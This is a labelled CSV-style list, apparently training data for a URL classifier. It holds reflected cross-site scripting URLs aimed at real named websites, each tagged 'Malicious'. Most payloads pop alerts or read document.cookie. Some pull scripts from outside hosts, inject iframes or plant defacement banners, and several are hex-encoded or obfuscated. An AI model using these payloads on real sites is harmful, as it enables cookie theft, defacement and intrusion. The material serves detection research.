http://www.corbadev.kiev.ua/wiki/index.php?action=find&amp;find=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert<br>(1337)%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.residentadvisor.net/404.aspx?aspxerrorpath=%3cscript%3ealert(/fucked/)%3c/script%3e,Malicious
http://search.atomz.com/search/?sp-q=yo&amp;sp-a=sp10029149&amp;sp-p=all&amp;sp-f=iso-8859-1&amp;submit.x=%22%3e%3c%<br>73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3<br>c%2f%73%63%72%69%70%74%3e&amp;submit.y=0,Malicious
http://www.idt.min-saude.pt/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;script&gt;a<br>lert(document.cookie)&lt;/script&gt;,Malicious
http://search.fasthealth.com/cgi-bin/texis/webinator/search/?query=%3c%2ftitle%3e%3cscript%3ealert%2<br>8123%29%3c%2fscript%3e&amp;station=h_mcm_tx&amp;search.x=0&amp;search.y=0,Malicious
http://www.eniacarpets.nl/enia/index.php?storyid=73&amp;websitelang=nl&amp;ctssubproject=&quot;&gt;&lt;script&gt;alert(123<br>)&lt;/script&gt;,Malicious
http://www.flyfishinginmaine.com/story.php?id=58%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
https://www.rentacoder.com/rentacoder/dotnet/docs/showtextinpopup.aspx?txttitle=%22%3e%3c/title%3e%3<br>cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.gnto.gr/results.php?langid=1&amp;search=%22%3cscript%3ealert%28%2fst%40r-gaz3r%2f%29%3c%2fscr<br>ipt%3e%3cmarquee%3e%3ch1%3est%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e&amp;x=0&amp;y=0,Malicious
http://www.homecharlotte.com/users/managers/registermanager.cfm?aff=%22%3e%3cscript%20src=http://vul<br>n.xssed.net/thirdparty/scripts/ckers.org.js%3e%3c/script%3e,Malicious
http://www.mambers.com/general-announcements/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;,Malicious
http://vads.ahds.ac.uk/results.php?cmd=search&amp;words=%3cscript%3ealert%28%27xylitol+is+back%27%29%3c%<br>2fscript%3e&amp;mode=boolean&amp;submit.x=15&amp;submit.y=12&amp;submit=submit,Malicious
http://www.rtl.it/cerca/cerca.asp?cerca=%22%3e%3cimg+src%3d%22http%3a%2f%2fimg96.imageshack.us%2fimg<br>96%2f8009%2fxssks5.jpg%22%3e&amp;search_submit.x=5&amp;search_submit.y=8,Malicious
http://www.pwd-online.ca/pwds.2l.2ctg.2.4@.jsp?cat=87&amp;amp;geo=10&amp;callscrn=pwdlist.jsp%22%3e%22%3e%3c<br>script%3ealert%28%22lejoner%22%29;%3c/script%3e,Malicious
http://www.sun.com/sunsurveys/np/npc-thanks.jsp?pagetype=recommend&amp;recommend=&quot;&gt;&lt;script&gt;alert('zuhaha<br>+0ssi3_tr')&lt;/script&gt;,Malicious
http://revistacofradia.com/wp-content/plugins/comment-rating/ck-processkarma.php?id=31&amp;action=add&amp;pa<br>th=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.noel-france.net/livredor/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ddindia.gov.in/ddindiachannel/kendrahome.aspx?k=<script>alert(document.cookie)</script>,Malicious
"http://news.com.com/2990-5_3-1.html?query=';alert(string.fromcharcode(88,83,83))//\';alert(string.fr<br>omcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,8<br>3,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://www.omega6d.org/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ram.uol.com.br/busca.asp?termo=%22%3e%3ch1%3e%3cscript%20src=http://mygot.110mb.com/lol.js%3e<br>%3c/script%3exss&amp;busca.x=0&amp;busca.y=0&amp;busca=busca,Malicious
http://ns31.ashiyanehost.com/admin/views/bad_refferer.php?<script>alert('lastrider-cyberbellona')</script>,Malicious
http://www.palaisdor.com/recherche2.php?unite=%3ciframe%20src=http://xssed.com%3e,Malicious
http://www.giochinumerici.info/portal/page/portal/sitoinformativowfl/homepage/cerca?ricerca=%22%3e%3<br>cscript+src%3d%22http%3a%2f%2fgooglebig.com%2fl.js%22%3e&amp;x=0&amp;y=0,Malicious
http://www.coolpictures.biz/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticx<br>s&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://online.americanexpress.com/myca/tpintg/us/action?request_type=auth_ommwelcome&amp;face=en_us&amp;enr<br>edirect=y&amp;dstpgredirect=y&amp;enoptions=y&amp;extlink=va:omm:welcomevanity&amp;intlink=us:ccsg:finemphub:main:ma<br>nage:moneymanager-%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.ruvr.ru/index.php?lng=pek&amp;w=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=%22%3e%3cscript%3ealert(documen<br>t.cookie);%3c/script%3e,Malicious
http://antt.dgarq.gov.pt/?s=%3e%22%3e%3ciframe+src%3d%22http%3a%2f%2fxssed.com%22%3e,Malicious
http://www.italo-motor.com/intranet/galeria/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://webcenters.netscape.compuserve.com/weather/find.jsp?f=""><script>alert(1)</script>",Malicious
http://www.internetteyim.net/robolistind.php?page=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cooki<br>e)%3b%3c/script%3e,Malicious
http://zonealarm.com/store/content/catalog/download_buy.jsp?dc=34std&amp;ctry=%22%3e%27%3e%3c%73%63%72%6<br>9%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31<br>%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%<br>2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;lang=ja,Malicious
http://www.uis.unesco.org/ev.php?url_id=2867&amp;url_do=do_topic&amp;url_section=&quot;&gt;&lt;script&gt;alert('h0t')&lt;/scr<br>ipt&gt;,Malicious
http://www.gopur.org/mf/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h<br>1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.healthline.com/search?q1=%27%3balert(string.fromcharcode(88%2c83%2c83))%2f%2f\%27%3balert<br>(string.fromcharcode(88%2c83%2c83))%2f%2f%22%3balert(string.fromcharcode(88%2c83%2c83))%2f%2f\%22%3b<br>alert(string.fromcharcode(88%2c83%2c83))%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert(stri<br>ng.fromcharcode(88%2c83%2c83))%3c%2fscript%3e,Malicious
http://starbeam.jpl.nasa.gov/tools/data_dictionary_lookup.cfm?obj=y&amp;search_field=%3cscript%3ealert(%<br>27al3m%27)%3c%2fscript%3e&amp;submit=search,Malicious
"http://it.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.austin360.com/news/bands/etc/loadartistportalsearch.jspd?searchtype=&quot;&gt;&lt;script&gt;alert(&quot;maxw<br>el&quot;)&lt;/script&gt;,Malicious
http://www.campsys.info/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.heartsandclubs.co.uk/alex_guestbook4/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.pcworld.com/pointroll/pointrollads.htm?pub=http://www.google.com?+&amp;redir=%27%3e%3cscript%<br>3ewindow.location=location.search.substring(5,28).concat(document.domain)%3c/script%3e&amp;ad=g235e20051<br>011164320",Malicious
http://www.benettonplay.com/toys/flipbook/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious
http://optimus.myspacecdn.com/apps/marriedonmyspace/poll.php?qnum=%22%3e%3cscript%3ealert%28document<br>.write%29%3c/script%3e,Malicious
http://ideas.mit.edu/~pscadmin/search-process.php?textsearch=%27%3balert%28string.fromcharcode%2884%<br>2c69%2c83%2c84%2c69%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2<br>f%2f%22%3balert%28string.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f%5c%22%3balert%28string.fr<br>omcharcode%2884%2c69%2c83%2c84%2c69%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28s<br>tring.fromcharcode%2884%2c69%2c83%2c84%2c69%29%29%3c%2fscript%3e,Malicious
http://www.sykesvilleandpatapscorailway.org/photogallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(docum<br>ent.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://myfinestsearch.com/search/search.php?keyword=%22%3e%3cscript%3ealert(0)%3c/script%3e,Malicious
http://www.naukri.com/toolbar/toolbar.php?id=%3e%22%3e%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://www.moniker.com/renew-expired-domains.jsp?domain=a1-2.com%3cscript%3ealert(document.cookie)%3<br>c/script%3e,Malicious
http://www.kmox.com/topic/yahoo_search.php?page=1&amp;query=%27%3e%3cscript%3ealert(document.cookie)%3c/<br>script%3e&amp;x=32&amp;y=2&amp;scope=local&amp;affildata=ip%253d24.182.188.43%2526ua%253dmozilla%252f5.0%2b%2528wind<br>ows%253b%2bu%253b%2bwindows%2bnt%2b5.1%253b%2ben-us%253b%2brv%253a1.9.0.13%2529%2bgecko%252f20090730<br>22%2bfirefox%252f3.0.13%2526httpparameter%253d24.182.188.43&amp;serveurl=http%253a%252f%252fwww.kmox.com<br>%252fpages%252f2615.php,Malicious
http://docweb.pwv.gov.za/xampp/phpinfo.php?cx[][][][][][][][][][][][][][][][][][]=%22%3e%3cscript%3e<br>alert(document.cookie)%3c/script%3e,Malicious
http://www.kenthinks.com/cgi/search.cgi?keywords=%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://houston.astros.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://www.co.henry.il.us/assessor/search.asp?sortcol=pin&amp;pin=&amp;location=&amp;owner='%22%3e%3ch1%3erubber<br>duck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://foto.plius.lt/ieskoti/infoblokas?id=0&amp;cat=%22%3cscript%3ealert(7);%3c/script%3e,Malicious
"http://forum.forumactif.com/forum.htm?highlight=%3c/title%3e%3cscript%3ealert(/xss%20by%20warvector,<br>%20omg%20la%20securite%20!%20=_=/);%3c/script%3e%3ccenter%3e%3cp%20style=background-color:red;%20col<br>or:white;%3e%3ca%20target=_blank%20href=http://warveblog.tk%3e%3cimg%20src=http://img142.imageshack.<br>us/img142/80/ban44tf6.jpg%3e%3cbr%3e%3c/center%3e%3cbr%3e%3cbr%3e%3cp%3e%3ch1%20style=background-col<br>or:red;%20color:white;%20font-size:%20500px;%3e%3cmarquee%20direction=left%3ehtml%20injection%20by%2<br>0%3cimg%20src=http://img6.imageshack.us/img6/4955/warvector.gif%3e%20!",Malicious
http://www.skiclub-eggiwil.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://developer.mozilla.org/index.php?title=en&amp;revision=224%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://search.ce.cn/ced/search.jsp?defaultsearchcolumns=&amp;searchword=%27%27%3b%21--%22%3cscript%3eale<br>rt%280%29%3b%3c%2fscript%3e%3d%26%7b%28alert%281%29%29%7d&amp;channelid=79132&amp;newtitle=&amp;source=&amp;start=20<br>07-10-13&amp;resultshow=-1&amp;seltype=1&amp;selchannel=-1&amp;sortfield=,Malicious
http://www.erp.navy.mil/search.asp?glossarysearch=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%<br>2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit=search,Malicious
http://www.moe.edu.cn/edoas/website18/searchinfo.jsp?title1=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/=xssbydt=/)%3<br>b&lt;/script&gt;,Malicious
"http://www.sicherheit.info/si/cms.nsf/si.articles.search?searchview&query=""><script>alert(document.cookie)</script>",Malicious
http://www.traeume-neu-erleben.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.vertex.co.il/news_inthenewsshow.asp?id=156&amp;year=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.megabbs.com/cgi-bin/readres.cgi?bo=haihu&amp;vi=1028097629&amp;rm=100&amp;search=%27%3e%22%3e%3cscrip<br>t%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3e%3c%2fscript%3e,Malicious
http://www.msn.co.uk/customercare/protect/id/articles/default.asp?section=phishprotect&quot;&gt;&lt;/script&gt;&lt;sc<br>ript&gt;alert(&quot;the%20b3st%20attacker%20group%20//%20akincilar&quot;)&lt;/script&gt;,Malicious
http://www.desifre-oldun.org/mods.php?go=pm&amp;p=wri_msg&amp;towho=%3c/title%3e%3c/head%3e%3cscript%3ealert<br>(document.cookie)%3c/script%3e,Malicious
"http://xfinity.comcast.net/news/national/%27%3c/script%3e%3cscript%3ealert%28string.fromcharcode%2888,83,83%29%29%3c/script%3e/",Malicious
http://www.ashampoo.com/frontend/homepage/php/searchresults.php?session_langid=4&amp;hl=fr&amp;lr=lang_fr&amp;q=<br>%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e&amp;sa=,Malicious
http://www.heaven-hill.com/searchresults.shtml?db=hh&amp;query=%22%3e%3cscript%3ealert%28%22i%20love%20b<br>urnetts!%22%29%3c%2fscript%3e,Malicious
http://shop.amd.com/us/_layouts/shop/shop-amd.aspx?csquery=&amp;filter=%22%3e%3cscript%3ealert%28documen<br>t.cookie%29%3c/script%3e:%22%3e%3cimg%20src=http://www.zone-h.fr/partnerbanner/xssed.gif%20onmouseov<br>er=%22alert%28%27xss%27%29%22%20/%3e:%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
"http://www.mod.gov.my/index.php?option=com_search&amp;itemid=99999999&amp;searchword=&quot;&gt;&lt;script&gt;alert(string.<br>fromcharcode(61,88,83,83,66,121,68,84,61))&lt;/script&gt;&amp;submit=carian&amp;searchphrase=any&amp;ordering=newest",Malicious
"http://se.advertising.com/searchresults.php?keyword=that""><script>alert(document.cookie)</script>",Malicious
http://karnem.net/y_2_ogrno2.asp?okulturu=2&amp;okulkodu=00466&amp;okuladi=%3ccenter%3e%3cfont%20color=red%2<br>0size=20%20face=impact%3eby+panzerturk+hepsi5+am&amp;#305;nakoim%3c/font%3e%3c/center%3e,Malicious
http://lazoglu.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://library.dip.go.th/elib/cgi-bin/opacexe.exe?op=brw&amp;lang=0&amp;skin=u&amp;pat=%3c/title%3e%27%3e%22%3e%<br>3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e&amp;cat=sub&amp;db=main&amp;fmat=&amp;f8la<br>ng=&amp;f8pubplace=&amp;lpp=256,Malicious
http://www2.microsofttraining.com/content/secure/login.asp?ccpsubsiteid=0&amp;vdid=0&amp;hdnprivateeventid=&amp;<br>preregistrationid=%22%3e%3cscript%3ealert(/pwn3d/);%3c/script%3e,Malicious
http://www.networkworld.com/search/searchresults.html?qt=%22%3e%3cmarquee%3e%3ch1%3edefaced+by+ironz<br>org%3c%2fh1%3e%3c%2fmarquee%3e&amp;hpg1=sb&amp;search=%22%3e%3cmarquee%3e%3ch1%3edefaced+by+ironzorg%3c%2fh1<br>%3e%3c%2fmarquee%3e,Malicious
"http://cifraclub.terra.com.br/cifra_lista.php?texto=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83,32,<br>98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,103,98,117,115,116,101,<br>114,46,99,111,109,46,98,114));&lt;/script&gt;onde=1",Malicious
http://cn.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://www.nongkhai.go.th/waterrocket/guestbook/view.php?page=26&amp;list=10%27%3e%22%3e%3cscript%2fsrc%<br>3dhttp%3a%2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
https://webforms.ey.com/content/dcontactus_new?openform&amp;emailid=%22/%3e%3cscript%3ealert%28%27we%20l<br>ove%20security!%27%29;%3c/script%3eharon%20t.%20byrnes&amp;indx=&amp;site=au_en_contactus&amp;url=http://www.ey.<br>com/careers/executives/why-ernst---young,Malicious
https://infinity.icicibank.co.in/icici_search/app.jsp?normal=%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e&site=default_collection&client=icadv&output=xml_no_dtd&proxystylesheet=icadv&proxycustom=%253chome%2f%253e&advance_action=not_adv_search,Malicious
http://blog.ok.net/skyr3x/page/2414/%22%3e%3c/title%3e%3cscript%3ealert(1)%3c/script%3e/,Malicious
http://futbolitis.terra.es/resultado-busqueda/portada.cfm?buscar=&amp;pkcadena='&quot;--&gt;&lt;script&gt;alert('xss<br>grupo vul')&lt;/script&gt;,Malicious
http://chroniclingamerica.loc.gov/search/pages/results/?datefiltertype=year&amp;year=&amp;date1=01%2f01%2f18<br>80&amp;date2=12%2f31%2f1922&amp;ortext=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e&amp;andtex<br>t=&amp;phrasetext=&amp;proxtext=&amp;proximityvalue=5&amp;submit=search,Malicious
http://park.parkingpanel.com/?q=%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;domain=gorefest.t<br>k&amp;search=1&amp;submit=search&amp;to=310&amp;co=51&amp;fr=true,Malicious
http://www.carsambaram.gov.tr/mods.php?go=downloads&amp;p=ld&amp;mode=subs&amp;val=1%22%3e%3ch1%3ehacked%20by%20<br>st@rext%3c/h1%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.peterbeets.nl/index.php?pagina=27%27%20%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.fiferightsforum.org.uk/layout/bespoke_perfquestions/datepopup.cfm?formname=&quot;&gt;&lt;script&gt;aler<br>t(&quot;cyber-warrior.org&quot;)&lt;/script&gt;,Malicious
http://www.maidasoli.com/index.php?node=default&amp;messaggio=%3ch1%3exssed%20by%20googlebig.com%3c/h1%3<br>e%3cscript%3ealert%28document.cookie%29;%3c/script%3e,Malicious
http://urlseek10.vmn.net/search.php?lg=fr&amp;type=404&amp;tbo=toolbar.vmn.net__2fintl__2f__3flg__3dfr__26pg<br>__3doptions2_0&amp;q=http%3a%2f%2fwww.cios.org%2fwww%2fkeyword.htm%27%22%3e%3c%2ftitle%3e%3cscript%3eale<br>rt(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss%2520by%2520xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://fsj.haian.gov.cn/jishu/fydetal.asp?view=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e<br>%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.datamation.com.ar/resultado/index.jsp?surfacesearch=%22%3e%3cscript%20src=http://vuln.xss<br>ed.net/thirdparty/scripts/ckers.org.js%3e%3c/script%3e,Malicious
http://www.lons-zoom.fr/index.php?rech-site=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher,Malicious
http://www.kaspersky.com.pt/base/guest/mimemessage/test_multibyte_message.php?from_name=&gt;&quot;&gt;&lt;script%2<br>0%0a%0d&gt;alert(/xss%20by%20turkpower/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://kuvar.krstarica.com/l/napisite-komentar/?pid=84177%22%3e%3cscript%3ealert%28document.cookie%2<br>9%3c/script%3e,Malicious
http://www.inst-informatica.pt/cgi-bin/koha/opac-detail.pl?bib='&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/scrip<br>t&gt;&lt;marquee&gt;&lt;h1&gt;xss%20by%20xylitol&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.lycos.com/adv.php?query=%22%3e%3cscript%3ealert('nullflow')%3c/script%3e,Malicious
http://pastehtml.com/api/facebook_login?go='%22--%3e%3c/style%3e%3c/script%3e%3cscript%3ealert(/i%20<br>cant%20block/)%3c/script%3e%3ciframe%20src=http://www.reddit.com/r/xss/%20height=100%25%20%20%20widt<br>h=100%25%3e,Malicious
"http://www.marvel.com/digitalcomics/?dc_search=&quot;;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/scrip<br>t&gt;&lt;img src=&quot;&quot; alt=&quot;",Malicious
http://ihk.dasburo.de/bildung/lehrstellenboerse/such_betrieb.pl?betrieb=&quot;&gt;&lt;script&gt;alert(&quot;need a<br>job!? - totalschaden!&quot;)&lt;/script&gt;,Malicious
http://mamma.com/mamma?utfout=%22%3e%3ciframe%20src=http://www.google.com%3e&amp;qtype=0&amp;query=test&amp;subm<br>it=%a0%a0search%a0%a0,Malicious
http://www.info.ea.com/news/news.php?function=search&amp;search_for=%22%3e%3cscript%3ealert(/www.r3t.n3t<br>.nl/)%3c/script%3e,Malicious
http://mitworld.mit.edu/act_feedback.php?all_flds=x&amp;required_flds=x&amp;fname=&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/sc<br>ript&gt;&lt;meta content=&quot;,Malicious
http://www.boxer-design.ch/gallery/login.asp?n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.agito.pl/?switch=offer&amp;cmd=&amp;pid=&amp;phrase=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%<br>27%78%73%73%27%29%3b%3c%2f%73%63%72%69%70%74%3e,Malicious
http://www.nominet.org.uk/special/searchresults/?resultview=successxml&amp;searcheddirectorynames=all&amp;se<br>archstring=%3cscript%3ealert%28%27i-landet%27%29%3c%2fscript%3e&amp;search.x=47&amp;search.y=5,Malicious
http://www.irishweddingday.com/search/service.php?service=%3ciframe%20src=javascript:alert(123)%3e,Malicious
"http://www.abcgdd.com//form/validation.php?id=%27%22%28%29%26%251%3cscript%20%3ealert%28string.fromcharcode%2888,83,83%29%29%3c%2fscript%3e",Malicious
http://fzr78.multiply.com/guestbook%7d%3c/style%3e43%27%22%3e%3c/title%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e,Malicious
http://cms.infodome.nl/cms/showpage.jsp?action='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3c<br>marquee%3ewhitehat%20forever%3c/marque%3e&amp;menuid=12747,Malicious
"http://si.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://tv1.rtp.pt/epg/radio/programas/index.php?palavra=%3e%22%3e%3ciframe+src%3d%22http://xssed.com%22%3e,Malicious
http://www.sosyalvesiyasal.com//rss/show_webfeed.php?wccategory=0&amp;wcheadlines=%3ch1%3eby%20st@rext%3<br>c/h1%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.hackney.gov.uk/servapps/googlesearch/hackney/resultsb.asp?cx=013470174590691097405%3a3fbh<br>qwd9fes&amp;cof=forid%3a11&amp;q=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;sa=search,Malicious
http://www.shopmaker.jp/pro/list.cgi?kubun='%3e%22%3%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3ciframe%<br>20src=javascript:alert(1)%3e&amp;user=sh105252,Malicious
http://whitepapers.zdnet.com/search.aspx?kw=%3c/title%3e'.%3cscript%3ealert%28document.cookie%29%3c%<br>2fscript%3e&amp;cat=230&amp;go%21=,Malicious
http://www.sigma-aldrich.co.jp/user/search/brandsrch_list.php?srch_brnd_no='%3e%22%3e%3cscript/src=h<br>ttp://kusomiso.com/xss.js%3e%3c/script%3e&amp;srch_brnd_casno=xss_by_kusomiso.com,Malicious
http://www.kmsphq.com/product.asp?bigclassname=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarque<br>e%3e%3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://www.pizzahut.com/search/default.asp?qu=&gt;&gt;&lt;script&gt;alert(&quot;xss-arham+muhammad&quot;)&lt;/script&gt;&amp;action=<br>search,Malicious
http://www.bbcgermany.de/germany/suche/search.php?q=%22%3e%3cimg%20src%3dhttp%3a%2f%2fimg225.imagesh<br>ack.us%2fimg225%2f4465%2fzombie2t.jpg%20%2f%3e%3ciframe%20src%3dhttp%3a%2f%2fxssed.com%3e%3c%2fifram<br>e%3e%3ciframe%20src%3dhttp%3a%2f%2fhackebeil.blogspot.com%3e%3c%2fiframe%3e%3cscript%3ealert%28docum<br>ent.cookie%29%3c%2fscript%3e%3cobject%20width%3d640%20height%3d385%3e%3cparam%20name%3dmovie%20value<br>%3dhttp%3a%2f%2fwww.youtube.com%2fv%2fys6puis-wfw%3ffs%3d1%26amp%3bhl%3dde_de%3e%3c%2fparam%3e%3cpar<br>am%20name%3dallowfullscreen%20value%3dtrue%3e%3c%2fparam%3e%3cparam%20name%3dallowscriptaccess%20val<br>ue%3dalways%3e%3c%2fparam%3e%3cembed%20src%3dhttp%3a%2f%2fwww.youtube.com%2fv%2fys6puis-wfw%3ffs%3d1<br>%26amp%3bhl%3dde_de%20type%3dapplication%2fx-shockwave-flash%20allowscriptaccess%3dalways%20allowful<br>lscreen%3dtrue%20width%3d640%20height%3d385%3e%3c%2fembed%3e%3c%2fobject%3e%3cbr%3e%3ca%20href%3dhtt<br>p%3a%2f%2fhackebeil.blogspot.com%3ehackebeil.blogspot.com%3c%2fa%3e,Malicious
http://www.kutahyamehter.com/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.cfsan.fda.gov/cgi-bin/ws.cgi?query=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>stype=or&amp;submit=search,Malicious
http://www.computing.net/cgi-bin/at-search.cgi?forum=security&amp;search=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/scr<br>ipt&gt;,Malicious
http://turf.tf1.fr/aprh_photos.php?num_page=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e<br>%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
